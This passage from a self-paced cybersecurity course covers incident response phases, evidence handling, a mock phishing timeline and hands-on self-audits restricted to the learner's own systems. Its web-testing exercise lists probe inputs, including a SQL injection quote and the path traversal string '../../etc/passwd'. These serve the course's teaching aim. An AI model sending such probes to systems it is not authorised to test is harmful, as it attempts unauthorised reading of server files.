This is why CIS Controls puts inventory as Control 1 — first, before anything else — and why the phase's task asks you to map five controls to your home lab. Start where you are: for your home lab, list every machine, its OS, its services, and its purpose. That is a real asset inventory, and doing it once teaches the discipline.

#### Remediation versus mitigation

These two words are used interchangeably in conversation and mean different things in a report. Getting them right is a small professional detail.

| Term | What it does | Examples | Is the problem gone? |
|---|---|---|---|
| **Remediation** | Fixes the root cause | Patching the vulnerability, upgrading the component, correcting the misconfiguration | Yes |
| **Mitigation** | Reduces the risk without fixing the cause | Isolating the system from the network, adding a firewall rule, disabling a vulnerable feature, adding a compensating control | No |

Mitigation is legitimate and often necessary. You mitigate when a patch does not exist yet, or when the system cannot be taken down for patching.

But mitigation is a **holding action**, and the professional discipline is to record it as such with a review date, rather than letting a temporary workaround quietly become permanent. The most common real-world finding is a mitigation from three years ago that everyone forgot was temporary.

#### Patch verification: evidence versus assertion

**Patch verification** is the step that separates an assertion from evidence.

| Statement | What it is |
|---|---|
| “We deployed the patch” | A claim |
| “The patch is installed on 98 of 100 hosts, and here are the two exceptions with owner and date” | A fact |

Verifying means re-checking the version or re-scanning after remediation, and tracking exceptions explicitly. When you write your five CVE summaries for the deliverable, include the verification step for each — it is the part most beginners omit and the part an interviewer notices.

### Part 6 — Incident response: putting it together

#### The six phases, and why the order is the lesson

Incident response follows a standard lifecycle. The phases are worth knowing by name, because they are used as a shared vocabulary in every serious organisation.

| Phase | What happens |
|---|---|
| 1. **Preparation** | Before anything happens: plans, playbooks, tooling, contact lists, logging that is actually enabled, and rehearsals. Everything else is easier or impossible depending on this phase |
| 2. **Identification** | Is this actually an incident? Alerts fire constantly and most are benign; this phase is triage, confirming scope, and deciding whether to escalate |
| 3. **Containment** | Stop the spread. Isolate the host, disable the account, block the address. The goal is to prevent further damage *while preserving the ability to investigate* |
| 4. **Eradication** | Remove the attacker's presence. Delete the malware, remove **all** persistence mechanisms, close the exploited vulnerability |
| 5. **Recovery** | Restore normal operation safely. Restore from verified-clean backups, monitor for the attacker returning, and confirm the fix holds |
| 6. **Lessons learned** | What happened, why, and what changes. This is the phase that improves the *next* response, and the one most often skipped under time pressure |

#### Two observations that show understanding

**First, the phases are not always strictly sequential in practice.** Containment may begin while identification is still incomplete, because stopping active ransomware matters more than finishing the analysis.

**Second, the order encodes a real tension.** Containment and investigation pull against each other.

| Action | Stops the attacker? | Preserves evidence? |
|---|---|---|
| Pull the plug / power off | Yes | **No** — destroys volatile evidence: memory contents, network connections, running processes |
| Isolate network access | Yes | **Yes** — preserves host state while cutting the attack path |

This is why the professional instinct is to *isolate network access* rather than power off.

#### Evidence handling, and why it matters

**Evidence handling** exists to keep findings credible. If your investigation concludes “the attacker exfiltrated 4 GB,” that conclusion must rest on evidence that has not been altered.

The core principles:

| Principle | What it means in practice |
|---|---|
| **Preserve the original** | Work on copies. Take a forensic image before touching anything, and keep the original untouched |
| **Document the chain of custody** | Who handled the evidence, when, and what they did. This matters legally and for the credibility of your report |
| **Record your actions as you take them** | Including timestamps in a consistent timezone. Note UTC deliberately, because logs from different systems will be in different zones and correlating them is where error creeps in |
| **Note hashes** | Of any evidence collected, so alteration is detectable |

#### The order of volatility

**The order of volatility** is the principle that tells you what to collect first, because evidence disappears over time.

```text
Most volatile  → CPU registers, cache
               → RAM (running processes, network connections, encryption keys)
               → Network connections and routing tables
               → Disk (files, logs)
               → Backups and archival media
Least volatile → Physical configuration
```

Collect the most volatile first, because it disappears soonest.

Memory holds what is running *right now* — and in an era of fileless malware that lives only in memory, this is often the only place the evidence exists at all. This is why “just reboot it” is the single worst instinct in incident response: it destroys the most valuable evidence and may trigger the malware's own cleanup.

#### Building the incident timeline

The phase's task 7 asks for a **mock incident timeline for a phishing login**, and this is the exercise that ties the entire phase together.

A timeline is simply a chronological reconstruction of events, drawn from the logs described across all six parts. Building one is how you prove to yourself that you understand where evidence lives.

Worked example, which you should build your own version of:

| Time (UTC) | Event | Source | Interpretation |
|---|---|---|---|
| 02:14:03 | Phishing email delivered to `j.dela+cruz@example.com` | Mail gateway log | Initial access attempt (ATT&CK T1566) |
| 02:41:19 | User clicks link, credentials entered on lookalike domain | Proxy / DNS log | Credential harvesting |
| 02:41:52 | Event 4624, logon type 3, from `203.0.113.77` | Windows Security log | Attacker authenticated with stolen credentials |
| 02:52:10 | Event 4624, logon type 10 (RDP), from same address | Windows Security log | Attacker established interactive access |
| 02:58:44 | Event 4688: `cmd.exe` parented by `explorer.exe` | Sysmon / 4688 | Manual execution — hands on keyboard |
| 03:06:02 | New scheduled task created | Sysmon / Task Scheduler log | **Persistence** established |
| 03:11:30 | Outbound connection to `198.51.100.42:443`, 850 MB transferred | Firewall / proxy log | Possible **exfiltration** |
| 09:05:00 | Helpdesk ticket: user reports odd login alert | Ticketing system | **Identification** — nine hours late |

#### What that table demonstrates

Read it again and notice how much it covers.

| Element in the timeline | Where it came from in this phase |
|---|---|
| ATT&CK T1566 mapping | Phase 1 |
| Event IDs 4624 and 4688, logon types 3 and 10 | Part 1 |
| Process telemetry and a parent-child relationship | Part 2 |
| Outbound connection and volume | Part 3 |
| Scheduled task as persistence | Part 2 |
| Identification nine hours late | Part 6 |

It also shows the uncomfortable truth that incidents are usually identified hours or days after they begin, which is the argument for the detection improvements that come out of the lessons-learned phase.

#### Writing your own timeline

When you write yours, use the phase's deliverable structure. Identify the initial access, the authentication evidence, the persistence, and the exfiltration, and name which control would have broken the chain at each step.

That last column — the controls — is where you demonstrate the exit criterion.

#### Reporting

The final piece is the written report, and it is worth being direct about its importance: **a finding nobody can act on is not a finding.**

Technical skill that cannot be communicated does not translate into organisational value, which is why Phase 1 said that attackers do not write reports and professionals do.

#### A usable incident report structure

| Section | What goes in it |
|---|---|
| **Summary** | What happened, in plain language, for someone who will read only this paragraph |
| **Timeline** | The evidence table above |
| **Impact** | What was affected, what data, how many systems, what is the business consequence |
| **Root cause** | The actual weakness, not just the mechanism |
| **Actions taken** | Containment, eradication, recovery, with times |
| **Recommendations** | Specific, prioritised, and owned by someone |

#### Mechanism versus root cause

The distinction between a mechanism and a root cause is worth dwelling on, because it is the difference between a report that gets a control fixed and one that gets filed.

| Statement | Which is it? |
|---|---|
| “A user clicked a link” | Mechanism — true, but it names no fixable control |
| “Credential phishing succeeded because MFA was not enforced on this account” | Root cause — names the gap that can be closed |

Likewise, recommendation quality is a test:

| Recommendation | Verdict |
|---|---|
| “Improve security” | A wish |
| “Enforce MFA on all accounts by [date], owner [team], addressing the gap that allowed this” | Actionable: specific, prioritised, owned |

The GRC connection is direct. Recommendations become risk register entries, and the controls that address them map to CIS or NIST — which is the phase's final deliverable, the five-risk control-mapping table.

### Part 7 — Hands-on: the six domains, applied

Parts 1 to 6 covered six domains. This part makes you use each one on your own machine, because the difference between knowing what MFA is and having configured it is the difference between a definition and a skill.

Everything below runs on hardware you own or an account you created. **You may only run these against your own systems.** That is not a formality — port scanning, even locally, is the habit you are building, and the habit has to include knowing where the boundary is.

#### Domain 1 — Identity: audit your own authentication

Start with yourself. This is the fastest way to make identity security concrete.

| Step | Command or action | What you are looking for |
|---|---|---|
| 1 | Check your email at **haveibeenpwned.com** | Which breaches include you — most people are in several |
| 2 | List every account with MFA enabled | The protected set |
| 3 | List every account without it | This is your work queue |
| 4 | Find your recovery options for each | A stale recovery email is an unlocked back door |
| 5 | Check for old app passwords and OAuth grants | Access you granted years ago and forgot |

**On Windows, see what your own account can do:**

```powershell
whoami /all
net user $env:USERNAME
Get-LocalGroupMember -Group Administrators
```

**On Linux:**

```bash
id
sudo -l
getent group sudo
```

**What healthy looks like:** your daily account is *not* a local administrator. On Linux, `sudo -l` shows only what you actually need, not `(ALL : ALL) ALL` for no reason.

**Self-check:** name the one account whose compromise would hurt you most. If it does not have MFA, stop and fix that before continuing.

#### Domain 2 — Endpoint: read a real detection

Windows Defender keeps a history. Reading it teaches you what endpoint telemetry actually looks like.

```powershell
Get-MpThreatDetection | Select-Object -First 5
Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

| Question | Why it matters |
|---|---|
| Is real-time protection on? | The single most important endpoint control |
| What does the threat history show? | Real detections on your own machine, named |
| **What is in the exclusion list?** | An exclusion is a hole. A folder excluded "temporarily" two years ago is still a hole |

**The exclusion list is the exercise.** Look at it critically. Every entry is somewhere malware can run unopposed. On a home machine you may find entries you did not add, put there by an installer.

#### Domain 3 — Network: see your own traffic

**Only run this on your own network.** Scanning a network you do not own or administer is exactly the line Part 5 of Phase 1 described.

```bash
# Your own machine, and your own gateway only
ip addr            # or: ipconfig /all on Windows
ip route           # or: route print
ss -tulpn          # or: netstat -ano on Windows
```

Then look at what is listening and decide what should not be:

| Finding | Question to ask |
|---|---|
| A port listening on `0.0.0.0` | Does this need to be reachable from other machines, or only from `127.0.0.1` |
| A service you do not recognise | What installed it, and do you still use it? |
| A port open that you never configured | Investigate before assuming it is fine |

**Self-check:** for each listening port, say whether you could turn it off without breaking something you use. Ports you cannot justify are the finding.

#### Domain 4 — Web: test your own application

Phase 1 noted you have a web development background, which is a real advantage here. Use it.

In your browser's developer tools, on **a site you built yourself**:

| Step | What to do | What to look for |
|---|---|---|
| 1 | Submit a form and watch the Network tab | Where does the data go, and over what scheme? |
| 2 | Find the session cookie | Is `HttpOnly` set? Is `Secure` set? Is `SameSite` set? |
| 3 | Look at response headers | Is `Content-Security-Policy` present? |
| 4 | Try typing `'` into a search field | An error page here is a finding |
| 5 | Try `../../etc/passwd` in a file parameter | Anything other than a clean rejection is a finding |

If you have an old project, you will almost certainly find that your session cookie lacks `HttpOnly`. That discovery is worth more than reading the OWASP Top 10, because you found it yourself in your own code.

**Do not test any site you do not own.** If you want to practise against something realistic, use a purpose-built target like OWASP Juice Shop or DVWA in a local container — both are free and both are designed for exactly this.

#### Domain 5 — Vulnerability management: build a real triage table

Take five findings — from your own `nmap` output above, from a Nessus/OpenVAS scan of your own lab, or from the CVE exercise in Phase 1 — and score them.

| # | Finding | Exploitability | Exposure | Impact | Priority | Fix, owner, date |
|---|---|---|---|---|---|---|
| 1 | | Easy / Moderate / Hard | Internet / LAN / Local | High / Med / Low | | |
| 2 | | | | | | |
| 3 | | | | | | |
| 4 | | | | | | |
| 5 | | | | | | |

Then answer this, in writing: **which one do you fix first, and why not the CVSS 9.8?**

If your answer is "the 9.8 is on a machine that is off and unreachable, and the 7.5 is on the box facing the internet," you have understood the entire point of the phase.

#### Domain 6 — Incident response: work one incident fully

Pick the single most interesting finding from any exercise above and take it all the way through the six steps.

| Phase | What you produce |
|---|---|
| Preparation | What you had in place before, and what you lacked |
| Identification | What you observed, and how you knew it was not normal |
| Containment | What you did, and what it cost |
| Eradication | The root cause, not the mechanism |
| Recovery | How you confirmed it was actually fixed |
| Lessons learned | The one control that would have prevented it |

Then write the finding in the two shapes from earlier in this lesson, so you can feel the difference:

> **Mechanism:** "An unused service was listening on all interfaces."
>
> **Root cause:** "No process exists to review listening services after software installation, so services enabled by installers are never disabled."

The second one can be fixed by a control. The first one cannot.

#### What you now have that you did not before

| You can now | You still cannot |
|---|---|
| Audit your own identity and endpoint configuration and find gaps | Do this at organisational scale, with a directory and an MDM |
| Read listening ports and judge which are unjustified | Design network segmentation or write firewall rules |
| Test your own web application for common flaws | Do a security code review, or test an app behind a WAF |
| Score findings and defend a prioritisation | Run a vulnerability programme with SLAs and exception handling |
| Work one incident through all six phases | Do it under time pressure, or to an evidentiary standard |

That is a real foundation, and stating its edges plainly is what makes it credible.

### Key takeaways

- **The exit criterion is a three-part question**: which logs, which controls, which response steps. Answering all three about one incident is the skill this phase builds.
- **The most dangerous authentication event is a successful login.** Failed logins are usually noise; a successful login that does not fit the baseline is the signal.
- **MFA is not binary.** FIDO2 hardware keys, authenticator apps with number matching, push, and SMS are progressively weaker — and real-time phishing proxies and session token theft defeat some entirely.
- **SSO centralises authentication, which is both its strength and its risk.** One place to enforce and revoke; one place to compromise becomes everywhere.
- **AV matches signatures; EDR detects behaviour.** Only behavioural telemetry catches what has never been seen before, and only telemetry lets you reconstruct an incident afterwards.
- **4688 is not on by default.** The absence of an event may mean nobody enabled the logging — a lesson about detection in general.
- **Parent-child process relationships are where endpoint detection lives.** A document spawning a shell is the canonical pattern; check full paths, because masquerading relies on filenames.
- **Persistence is a finite, enumerable list** — Run keys, scheduled tasks, services, cron, systemd, `authorized_keys`. Find one mechanism and assume there are others.
- **Default-deny beats default-allow**; a forgotten rule then fails safely. Stale rules are the most common real firewall finding.
- **IDS alerts, IPS blocks — and the difference is the false-positive cost.** Blocking before you understand your noise causes outages.
- **Injection is one bug in different interpreters.** SQL injection and XSS are both "data escaped into code", and the fix is separation (parameterised queries, output encoding), never blocklists.
- **Access control bugs come from trusting the client.** IDOR and forced browsing exist because developers assumed nobody would change the number in the URL. The UI is not a control.
- **CVSS tells you severity, EPSS tells you likelihood, KEV tells you what is actually being exploited.** Prioritise on risk, not on score alone — a CVSS 9.8 in software you do not run is not urgent.
- **You cannot patch what you cannot list.** Asset inventory is the unglamorous prerequisite for everything in vulnerability management.
- **Remediation fixes the cause; mitigation reduces the risk.** Mitigation is a holding action and needs a review date, or it becomes permanent by accident.
- **Containment and investigation are in tension.** Isolate network access rather than powering off, or you destroy the volatile evidence — and "just reboot it" is the worst instinct in incident response.
- **Collect in order of volatility**, memory before disk, because RAM holds what fileless malware leaves behind and nothing else does.
- **Reports turn findings into fixes.** Mechanisms are not root causes, and a recommendation without an owner and a date is a wish.

### Practice this next

The seven tasks build on each other, and the ordering below is deliberate:

1. **Start with Sysmon and the event generation (tasks 1–3) as one continuous exercise.** Install Sysmon, then deliberately create the events: open PowerShell, create a file, fail a login, install and uninstall something harmless. Then go find each one in Event Viewer. The value is in the *hunting*, not the installing — you are learning what normal looks like, which is the prerequisite for noticing what is not. Look specifically for event 4688 process creation and check whether you had to enable auditing first.
2. **Do the PortSwigger labs next (task 4), spread across the phase.** Five Apprentice labs, one at a time, each written up as: the vulnerability, how I found it, the payload, and what the fix would be. Then, because of your web background, write the vulnerable code and the fixed version for one of them. This is your strongest differentiator — do not rush it.
3. **Use Burp Community or ZAP to intercept your own traffic (task 5)** while the labs are fresh. Watching a request you can edit is what turns "the app checks permissions" from a claim into something you have verified by changing a value and watching it fail.
4. **Then the CVE summaries (task 6)**, drawn from CISA's KEV catalog as the task specifies. For each of the five, record: affected product, CVSS score, whether it is in KEV, EPSS if available, what the impact is, and the fix — plus how you would *verify* the fix. Include the prioritisation reasoning from Part 5: if you had fifty CVEs and could fix five, why these?
5. **Write the incident timeline last (task 7)**, once Parts 1–4 have given you the log sources. Build the table as in the worked example, and add a column naming which control would have broken the chain at each step. Then write the short report around it, and pay attention to the root-cause line — it should name a control gap, not a user action.
6. **Finish with the control-mapping table** from the deliverable: five risks mapped to CIS or NIST controls. This is your first real GRC-flavoured artifact, and if the writing came easily, that is useful information for your Phase 5 specialisation choice.
7. **Read your own output end to end and check it against the exit criterion**: can you explain a phishing or web login abuse attack and name the logs, controls, and response steps? If the timeline and report do that convincingly, Phase 4's labs will make sense — and you will arrive at the specialisation choice in Phase 5 with evidence about which of the six areas you actually enjoyed.

## Tools for This Phase

| Tool | What it does | Cost | Official link | Mini-task | Free alternative |
|---|---|---|---|---|---|
| Windows Event Viewer | View Windows logs | Free | https://learn.microsoft.com/windows | Find login-related events | PowerShell log commands |
| Sysmon | Adds detailed Windows telemetry | Free | https://learn.microsoft.com/sysinternals/downloads/sysmon | Install in lab and view process events | Windows Security logs only |
| Wazuh | SIEM/XDR/log analysis | Free/open-source | https://wazuh.com/ | Read install docs and plan lab | Elastic/Splunk free tier |
| Greenbone Community Edition | Vulnerability scanning | Free/open-source | https://greenbone.github.io/docs/latest/ | Study scanner workflow; optional local scan | Nmap scripts |
| OWASP ZAP | Web app security testing | Free/open-source | https://www.zaproxy.org/ | Passive scan a local/test app | Burp Suite Community |
| Burp Suite Community | Web proxy | Free/community | https://portswigger.net/burp/communitydownload | Intercept a PortSwigger lab request | OWASP ZAP |
| CIS Controls | Security controls framework | Free | https://www.cisecurity.org/controls | Map 5 controls to home lab | NIST CSF |

## Free/cheap resources

- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy — https://portswigger.net/web-security
- MITRE ATT&CK — https://attack.mitre.org/
- Wazuh documentation — https://documentation.wazuh.com/
- CIS Controls — https://www.cisecurity.org/controls
- Microsoft security documentation — https://learn.microsoft.com/en-us/security/
- CISA known exploited vulnerabilities catalog — https://www.cisa.gov/known-exploited-vulnerabilities-catalog

## Hands-on practice tasks

1. Install Sysmon on a Windows VM or your own lab machine if safe.
2. Generate a few safe events: open PowerShell, create a file, fail a login, install/uninstall a harmless app.
3. Find related logs in Event Viewer.
4. Complete 5 PortSwigger Apprentice-level labs.
5. Use Burp Community or OWASP ZAP to intercept your own browser traffic to a training lab.
6. Pick 5 CVEs from CISA KEV and summarize affected product, impact, and fix.
7. Write a mock incident timeline for a phishing login.

## Deliverable / proof of work

Create `portfolio/cyber/03-security-fundamentals.md` with:

- Event Viewer/Sysmon screenshots
- 5 PortSwigger lab notes
- 5 CVE summaries
- One mock incident timeline
- Table mapping 5 risks to CIS or NIST controls

## Checklist

- [ ] I understand identity security basics. <!-- id: cyber-03-c01 energy: low -->
- [ ] I understand endpoint security basics. <!-- id: cyber-03-c02 energy: low -->
- [ ] I understand network security basics. <!-- id: cyber-03-c03 energy: low -->
- [ ] I understand OWASP Top 10 at a basic level. <!-- id: cyber-03-c04 energy: low -->
- [ ] I completed 5 PortSwigger labs. <!-- id: cyber-03-c05 energy: normal -->
- [ ] I inspected Windows security/process logs. <!-- id: cyber-03-c06 energy: normal -->
- [ ] I summarized 5 CVEs. <!-- id: cyber-03-c07 energy: normal -->
- [ ] I wrote a mock incident timeline. <!-- id: cyber-03-c08 energy: normal -->

## You're ready to move on when...

You can explain a simple attack like phishing or web login abuse and name the logs, controls, and response steps involved.

## Free vs Paid

### What's free and enough

Event Viewer, Sysmon, Wazuh docs, PortSwigger Academy, Burp Community, OWASP ZAP, MITRE, CIS, and NIST are enough.

### What's paid and why you'd upgrade

Burp Suite Professional, commercial SIEMs, and paid vulnerability scanners add speed, automation, and enterprise features.

### When it's worth paying

Not in this phase. Burp Community and free labs are enough.
